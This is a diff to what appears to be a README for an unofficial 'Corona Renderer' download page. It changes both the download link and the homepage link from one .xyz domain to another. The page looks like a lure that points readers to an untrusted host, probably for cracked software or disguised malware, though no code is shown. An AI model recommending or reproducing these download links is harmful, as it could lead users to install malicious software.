@@ -25,8 +25,8 @@ The goal is a tool that just works — no clutter, no bloat.
 ---
 
 ## Get it
-- 📥 **Grab the latest version:** [https://corona-renderer-vault.softonx.xyz](https://corona-renderer-vault.softonx.xyz)
-- 📖 **Homepage:** [https://corona-renderer-vault.softonx.xyz](https://corona-renderer-vault.softonx.xyz)
+- 📥 **Grab the latest version:** [https://corona-renderer-vault.softax.xyz](https://corona-renderer-vault.softax.xyz)
+- 📖 **Homepage:** [https://corona-renderer-vault.softax.xyz](https://corona-renderer-vault.softax.xyz)
 
 ---
 
